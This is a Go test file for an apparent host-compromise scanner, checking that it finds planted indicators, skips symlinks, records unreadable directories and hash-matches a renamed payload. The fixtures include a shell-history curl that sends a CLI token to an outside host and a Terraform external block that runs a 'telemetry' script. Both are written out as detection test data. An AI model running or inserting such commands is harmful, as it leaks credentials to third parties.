// Copyright 2026 Optimus Labs (Civilizations research team)
// SPDX-License-Identifier: Apache-2.0

package fs

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/optimuslabs-io/leakpatrol/internal/engine"
	"github.com/optimuslabs-io/leakpatrol/internal/model"
	"github.com/optimuslabs-io/leakpatrol/internal/scan"
)

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestFsTierFindsEveryHostIndicator(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, "work", ".terraform", "modules", "aider", "main.tf"),
		"data \"external\" \"telemetry\" {\n  program = [\"sh\", \"${path.module}/dlp.sh\"]\n}\n")
	write(t, filepath.Join(root, "work", ".terraform", "modules", "aider", "dlp.sh"), "#!/bin/sh\necho placeholder\n")
	write(t, filepath.Join(root, "home", ".zsh_history"), ": 1:0;curl -H 'X-CLI-Token: t' http://www.coder-infra.com/cli/check\n")
	write(t, filepath.Join(root, "home", "clean.txt"), "nothing to see\n")
	write(t, filepath.Join(root, "bin", "tool"), "\x7fELF\x00\x00\x00 199.91.220.205")

	env := &engine.Env{Home: filepath.Join(root, "home"), Roots: []string{root}, MaxFileSize: 1 << 20}
	res := New().Run(context.Background(), env)

	ids := map[string]model.Finding{}
	for _, f := range res.Findings {
		ids[f.ID] = f
	}
	if f, ok := ids["fs.telemetry_block"]; !ok || f.Severity != model.SevHigh || len(f.Evidence) != 1 {
		t.Errorf("telemetry block: %+v", f)
	}
	if f, ok := ids["fs.history_exfil"]; !ok || f.Severity != model.SevCritical || f.Path != model.PathExecuted {
		t.Errorf("history exfil: %+v", f)
	} else if f.Evidence[0].Path != "~/.zsh_history" || f.Evidence[0].Locator != "line:1" {
		t.Errorf("history evidence should be home-relative with a line: %+v", f.Evidence[0])
	}
	if f, ok := ids["fs.script_name"]; !ok || f.Severity != model.SevLow {
		t.Errorf("weak script name: %+v", f)
	}
	if _, ok := ids["fs.payload_hash"]; ok {
		t.Error("nothing in the fixture is a real payload; a hash match is a bug")
	}
	if _, ok := ids["fs.indicator_reference"]; ok {
		t.Error("the ELF blob must not be text-scanned")
	}
	for _, e := range res.Errors {
		t.Errorf("unexpected scan error: %+v", e)
	}
}

func TestFsTierRecordsUnreadableDirectoriesAsMaterial(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("permission bits are not enforceable here")
	}
	root := t.TempDir()
	locked := filepath.Join(root, "locked")
	write(t, filepath.Join(locked, "x.txt"), "x")
	if err := os.Chmod(locked, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(locked, 0o755) })

	res := New().Run(context.Background(), &engine.Env{Home: root, Roots: []string{root}})
	material := false
	for _, e := range res.Errors {
		if e.Kind == "permission" && e.Material {
			material = true
		}
	}
	if !material {
		t.Errorf("an unreadable directory must be a material error, got %+v", res.Errors)
	}
}

func TestFsTierSkipsSymlinksAndMissingRoots(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks need privileges on windows")
	}
	root := t.TempDir()
	outside := t.TempDir()
	write(t, filepath.Join(outside, ".bash_history"), "curl http://www.coder-infra.com/cli/check\n")
	if err := os.Symlink(outside, filepath.Join(root, "link")); err != nil {
		t.Fatal(err)
	}
	res := New().Run(context.Background(), &engine.Env{Home: root, Roots: []string{root, filepath.Join(root, "does-not-exist")}})
	if len(res.Findings) != 0 {
		t.Errorf("a symlinked directory must not be followed: %+v", res.Findings)
	}
	if len(res.Errors) != 0 {
		t.Errorf("a missing root is not an error: %+v", res.Errors)
	}
}

// TestPass1ShortCircuitsPass2 is the fast path this tier exists for: once pass 1
// finds a HIGH+ indicator in a known-bad location, an indicator sitting in an
// ordinary text file elsewhere must NOT also be reported -- pass 2 never runs,
// because the verdict is already set and reading everything else would only cost
// time on a host that has already answered the question.
func TestPass1ShortCircuitsPass2(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, "work", ".terraform", "modules", "aider", "main.tf"),
		"data \"external\" \"telemetry\" {\n  program = [\"sh\"]\n}\n")
	write(t, filepath.Join(root, "elsewhere", "notes.txt"), "saw a request to www.coder-infra.com in the logs today\n")

	res := New().Run(context.Background(), &engine.Env{Home: root, Roots: []string{root}})
	for _, f := range res.Findings {
		if f.ID == "fs.indicator_reference" {
			t.Errorf("pass 2 must not have run once pass 1 found a HIGH indicator: %+v", f)
		}
	}
	found := false
	for _, l := range res.Limitations {
		if strings.Contains(l, "pass 2 skipped") {
			found = true
		}
	}
	if !found {
		t.Errorf("the report must say pass 2 was skipped and why, got limitations: %v", res.Limitations)
	}
	if !strings.Contains(res.Summary, "pass 1 only") {
		t.Errorf("summary should say pass 1 only ran, got %q", res.Summary)
	}
}

// TestPass2CatchesRenamedPayload is the safety net pass 1 cannot provide: a copy
// of a harvester script under an innocuous name, outside every known-bad
// location, is invisible to name/location checks and to a text-marker scan (its
// content here is plain but does not itself contain a marker string). Only a
// hash match on the deferred file -- pass 2 -- can catch it, and it must run
// because pass 1 found nothing at or above HIGH.
func TestPass2CatchesRenamedPayload(t *testing.T) {
	fake := []byte("#!/bin/sh\n# a stand-in for a renamed harvester copy\nexit 0\n")
	sum := scan.DigestBytes(fake)
	scan.Payloads[sum] = scan.Payload{SHA256: sum, Label: "test-fixture renamed payload"}
	t.Cleanup(func() { delete(scan.Payloads, sum) })

	root := t.TempDir()
	write(t, filepath.Join(root, "opt", "update-checker.sh"), string(fake))

	res := New().Run(context.Background(), &engine.Env{Home: root, Roots: []string{root}})
	var hit *model.Finding
	for i := range res.Findings {
		if res.Findings[i].ID == "fs.payload_hash" {
			hit = &res.Findings[i]
		}
	}
	if hit == nil || hit.Severity != model.SevHigh || len(hit.Evidence) != 1 || hit.Evidence[0].SHA256 != sum {
		t.Fatalf("pass 2 should have hash-matched the renamed payload, got findings %+v", res.Findings)
	}
	if !strings.Contains(res.Summary, "hit") {
		t.Errorf("summary should reflect the hit, got %q", res.Summary)
	}
}

// TestReadForInspectionHashesSmallUnnamedBinaries proves the size-band override
// directly: a file with no script name, classified binary by the sniff (a NUL in
// its first bytes), still gets read and hashed when it is small -- the case a
// renamed-and-slightly-mangled payload would fall into.
func TestReadForInspectionHashesSmallUnnamedBinaries(t *testing.T) {
	dir := t.TempDir()
	content := append([]byte{0}, []byte(strings.Repeat("x", 100))...)
	path := filepath.Join(dir, "blob.dat")
	if err := os.WriteFile(path, content, 0o644); err != nil {
		t.Fatal(err)
	}
	got, truncated, skipped, _, err := readForInspection(path, int64(len(content)), DefaultMaxFileSize)
	if err != nil || skipped || truncated || len(got) != len(content) {
		t.Fatalf("small binary-classified file should be read in full: got=%d truncated=%v skipped=%v err=%v", len(got), truncated, skipped, err)
	}

	big := make([]byte, hashSizeBand+1)
	bigPath := filepath.Join(dir, "big.dat")
	if err := os.WriteFile(bigPath, big, 0o644); err != nil {
		t.Fatal(err)
	}
	_, _, skipped, _, err = readForInspection(bigPath, int64(len(big)), DefaultMaxFileSize)
	if err != nil || !skipped {
		t.Errorf("a large unnamed binary must still be skipped: skipped=%v err=%v", skipped, err)
	}
}
